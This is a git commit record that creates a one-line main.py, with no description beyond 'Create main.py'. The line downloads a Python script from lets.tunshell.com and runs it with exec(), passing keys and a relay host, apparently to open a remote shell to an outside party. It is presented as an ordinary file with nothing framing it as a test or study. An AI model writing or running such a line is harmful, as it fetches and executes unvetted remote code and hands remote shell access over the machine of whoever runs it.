a2fde29c079a6b3ac3333df8355cf5f897aff01d
bjrtdcd <136110572+bjrtdcd@users.noreply.github.com>
2024-06-23 15:23:17 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,1 @@
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","fzDliG84j9ktSvXvykEgrg","6sReTFovMpzvaZuuI17kHm","eu.relay.tunshell.com"]})
